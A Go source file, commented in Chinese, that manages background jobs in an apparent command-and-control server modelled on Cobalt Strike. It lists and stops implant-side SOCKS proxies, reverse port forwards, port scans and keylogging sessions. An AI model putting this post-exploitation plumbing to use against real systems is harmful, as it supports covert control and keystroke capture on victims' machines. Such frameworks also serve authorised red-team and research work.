package main

import (
	"fmt"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

/* 统一 Job 体系 —— 长任务的登记、查看与终止。
 *
 * 对标 Cobalt Strike 的 jobs / jobkill:
 *   jobs              列出全部作业
 *   jobs <sid>        只看某个会话
 *   jobkill <id>      终止(可终止的)作业
 *
 * 与协议里的"分块下载 job id"不是一回事: 那是传输层的数据块编号,
 * 这里是操作员视角的后台作业。命名上刻意区分(bgJob)。
 *
 * 可终止性如实标注: SOCKS 与 rportfwd 有真实的停止通道(ProxyStop /
 * RPortfwdStop), portscan / keylog 这类一次性任务下发后无法中途掐断 ——
 * 这类作业 Killable=false, jobkill 会明确回"不可中断"而不是假装成功。
 */

type bgJob struct {
	ID       string `json:"id"`
	SID      string `json:"sid"`
	Kind     string `json:"kind"`
	Detail   string `json:"detail"`
	Port     int    `json:"port,omitempty"`
	TaskID   uint32 `json:"task_id,omitempty"`
	Started  int64  `json:"started"`
	Ended    int64  `json:"ended,omitempty"`
	Status   string `json:"status"` // running / done / killed / failed
	Killable bool   `json:"killable"`
	Note     string `json:"note,omitempty"`
}

var bgJobStore = struct {
	mu   sync.Mutex
	seq  int
	jobs []*bgJob
}{}

const bgJobKeep = 200

// bgJobStart 登记一个后台作业
func bgJobStart(sid, kind, detail string, port int, killable bool) *bgJob {
	bgJobStore.mu.Lock()
	defer bgJobStore.mu.Unlock()
	j := &bgJob{
		ID:       strconv.Itoa(bgJobStore.seq),
		SID:      sid,
		Kind:     kind,
		Detail:   detail,
		Port:     port,
		Started:  time.Now().Unix(),
		Status:   "running",
		Killable: killable,
	}
	bgJobStore.seq++
	bgJobStore.jobs = append(bgJobStore.jobs, j)
	if len(bgJobStore.jobs) > bgJobKeep {
		bgJobStore.jobs = bgJobStore.jobs[len(bgJobStore.jobs)-bgJobKeep/2:]
	}
	return j
}

// bgJobBind 把作业与下发的任务号绑定(结果回来时据此收尾)
func bgJobBind(id string, taskID uint32) {
	if id == "" {
		return
	}
	bgJobStore.mu.Lock()
	defer bgJobStore.mu.Unlock()
	for _, j := range bgJobStore.jobs {
		if j.ID == id {
			j.TaskID = taskID
			return
		}
	}
}

// bgJobFinishTask 按 (会话,任务号) 收尾 —— 由结果回传路径调用
func bgJobFinishTask(sid string, taskID uint32, ok bool) {
	bgJobStore.mu.Lock()
	defer bgJobStore.mu.Unlock()
	for i := len(bgJobStore.jobs) - 1; i >= 0; i-- {
		j := bgJobStore.jobs[i]
		if j.SID == sid && j.TaskID == taskID && j.Status == "running" {
			if ok {
				j.Status = "done"
			} else {
				j.Status = "failed"
			}
			j.Ended = time.Now().Unix()
			return
		}
	}
}

// bgJobEndByKind 某类作业在指定端口上结束后收尾(SOCKS/rportfwd 停止时用)
func bgJobEndByKind(sid, kind string, port int, status, note string) {
	bgJobStore.mu.Lock()
	defer bgJobStore.mu.Unlock()
	for i := len(bgJobStore.jobs) - 1; i >= 0; i-- {
		j := bgJobStore.jobs[i]
		if j.SID == sid && j.Kind == kind && j.Port == port && j.Status == "running" {
			j.Status = status
			j.Note = note
			j.Ended = time.Now().Unix()
			return
		}
	}
}

func bgJobAll() []*bgJob {
	bgJobStore.mu.Lock()
	defer bgJobStore.mu.Unlock()
	out := make([]*bgJob, 0, len(bgJobStore.jobs))
	for _, j := range bgJobStore.jobs {
		cp := *j
		out = append(out, &cp)
	}
	return out
}

func bgJobForSession(sid string) []*bgJob {
	out := []*bgJob{}
	for _, j := range bgJobAll() {
		if j.SID == sid {
			out = append(out, j)
		}
	}
	return out
}

func bgJobFind(id string) *bgJob {
	for _, j := range bgJobAll() {
		if j.ID == id {
			return j
		}
	}
	return nil
}

// bgJobRunningCount 供 /api/state 用
func bgJobRunningCount(sid string) int {
	n := 0
	for _, j := range bgJobAll() {
		if j.Status == "running" && (sid == "" || j.SID == sid) {
			n++
		}
	}
	return n
}

// bgJobHistory 已结束的作业只展示最近若干条
func bgJobForSessionLimited(sid string, limitDone int) []*bgJob {
	all := bgJobForSession(sid)
	done := 0
	out := []*bgJob{}
	for i := len(all) - 1; i >= 0; i-- {
		j := all[i]
		if j.Status == "running" {
			out = append(out, j)
			continue
		}
		if done < limitDone {
			out = append(out, j)
			done++
		}
	}
	// 反转回时间顺序
	for i, k := 0, len(out)-1; i < k; i, k = i+1, k-1 {
		out[i], out[k] = out[k], out[i]
	}
	return out
}

// ---------------------------------------------------------------- 终止

/* bgJobKill 终止一个作业。
 * 返回 (说明, error); 不可终止的类型返回说明但不改状态 —— 不假装成功。 */
func bgJobKill(id string) (string, error) {
	j := bgJobFind(id)
	if j == nil {
		return "", fmt.Errorf("没有 job %s", id)
	}
	bgJobStore.mu.Lock()
	st := j.Status
	kind := j.Kind
	sid := j.SID
	port := j.Port
	bgJobStore.mu.Unlock()

	if st != "running" {
		return fmt.Sprintf("job %s 已经是 %s 状态", id, st), nil
	}

	switch kind {
	case "socks":
		if err := ProxyStop(sid, port); err != nil {
			return "", err
		}
		bgJobEndByKind(sid, "socks", port, "killed", "已停止 SOCKS 监听")
		eventLog("operator", sid, "jobkill", "socks "+strconv.Itoa(port))
		return fmt.Sprintf("[+] job %s (SOCKS %d) 已停止", id, port), nil
	case "rportfwd":
		if err := RPortfwdStop(sid, port); err != nil {
			return "", err
		}
		bgJobEndByKind(sid, "rportfwd", port, "killed", "已停止反向转发")
		eventLog("operator", sid, "jobkill", "rportfwd "+strconv.Itoa(port))
		return fmt.Sprintf("[+] job %s (rportfwd %d) 已停止", id, port), nil
	case "keylog":
		sess := v2st.lookup(sid)
		if sess == nil {
			return "", fmt.Errorf("无此 v2 会话: %s", sid)
		}
		// 植入体侧 CMD_KEYLOG arg[0]=0 即停止并把残余捕获补发回来
		sess.enqueue(cmdKeylog, "keylog", []byte{0})
		bgJobEndByID(id, "killed", "已停止键盘记录")
		eventLog("operator", sid, "jobkill", "keylog")
		return fmt.Sprintf("[+] job %s (键盘记录) 已停止", id), nil
	default:
		/* 一次性任务(端口扫描等)下发后无法中途掐断 —— 如实说明 */
		return fmt.Sprintf("[-] job %s (%s) 是一次性任务, 无法中途终止: %s",
			id, kind, j.Detail), nil
	}
}

// bgJobEndByID 按作业号收尾
func bgJobEndByID(id, status, note string) {
	bgJobStore.mu.Lock()
	defer bgJobStore.mu.Unlock()
	for i := len(bgJobStore.jobs) - 1; i >= 0; i-- {
		j := bgJobStore.jobs[i]
		if j.ID == id && j.Status == "running" {
			j.Status = status
			j.Note = note
			j.Ended = time.Now().Unix()
			return
		}
	}
}

// ---------------------------------------------------------------- 命令接入

/* jobTryCommand 拦截服务端侧作业命令; 命中返回 true。
 * 必须在 v2TryCommand 之前调用(否则命令会被当植入体指令下发)。 */
func jobTryCommand(w http.ResponseWriter, sid, cmd string) bool {
	f := strings.Fields(strings.TrimSpace(cmd))
	if len(f) == 0 {
		return false
	}
	switch f[0] {
	case "jobs":
		target := sid
		if len(f) > 1 {
			target = f[1]
		}
		jobs := bgJobForSessionLimited(target, 20)
		lines := []string{}
		if len(jobs) == 0 {
			lines = append(lines, fmt.Sprintf("(会话 %s 没有作业)", target))
		}
		for _, j := range jobs {
			state := j.Status
			if j.Status == "running" {
				state = "running"
			}
			kill := "不可中断"
			if j.Killable {
				kill = "jobkill " + j.ID
			}
			lines = append(lines, fmt.Sprintf("%s  %-9s %-16s %s  [%s, %s]",
				j.ID, j.Kind, j.Detail, state, ago(j.Started), kill))
		}
		writeJSON(w, map[string]interface{}{
			"ok": true, "jobs": jobs, "text": strings.Join(lines, "\n"),
		})
		return true
	case "jobkill":
		if len(f) < 2 {
			writeJSON(w, map[string]interface{}{"ok": false, "error": "用法: jobkill <id>  (jobs 查看 id)"})
			return true
		}
		msg, err := bgJobKill(f[1])
		if err != nil {
			writeJSON(w, map[string]interface{}{"ok": false, "error": err.Error()})
			return true
		}
		writeJSON(w, map[string]interface{}{"ok": true, "text": msg})
		return true
	}
	return false
}

// ago 把 Unix 秒变成 "12s" / "3m" / "1h" 这种相对时间
func ago(ts int64) string {
	if ts == 0 {
		return "-"
	}
	d := time.Now().Unix() - ts
	if d < 0 {
		d = 0
	}
	switch {
	case d < 60:
		return fmt.Sprintf("%ds", d)
	case d < 3600:
		return fmt.Sprintf("%dm", d/60)
	default:
		return fmt.Sprintf("%dh", d/3600)
	}
}

// bgJobClassify 判断一条操作员命令是否属于"后台作业"。
// bind=true 表示"任务结果回来就算作业结束"(一次性任务);
// keylog 这类 start 返回后仍在后台跑, 不能绑定。
func bgJobClassify(cmd string) (kind, detail string, killable, bind, ok bool) {
	f := strings.Fields(strings.TrimSpace(cmd))
	if len(f) == 0 {
		return "", "", false, false, false
	}
	switch strings.ToLower(f[0]) {
	case "portscan":
		d := "端口扫描"
		if len(f) > 1 {
			d = "端口扫描 " + strings.Join(f[1:], " ")
		}
		// 端口扫描一次性下发, 植入体侧没有中途掐断的通道
		return "portscan", d, false, true, true
	case "keylog":
		if len(f) > 1 {
			lw := strings.ToLower(f[1])
			if lw == "dump" || lw == "status" || lw == "stop" || lw == "0" {
				return "", "", false, false, false
			}
		}
		return "keylog", "键盘记录", true, false, true
	}
	return "", "", false, false, false
}

// ---------------------------------------------------------------- HTTP

func handleJobs(w http.ResponseWriter, r *http.Request) {
	sid := r.URL.Query().Get("sid")
	var jobs []*bgJob
	if sid != "" {
		jobs = bgJobForSessionLimited(sid, 50)
	} else {
		jobs = bgJobAll()
	}
	sort.SliceStable(jobs, func(i, j int) bool { return jobs[i].Started < jobs[j].Started })
	writeJSON(w, map[string]interface{}{
		"ok":      true,
		"jobs":    jobs,
		"running": bgJobRunningCount(""),
	})
}
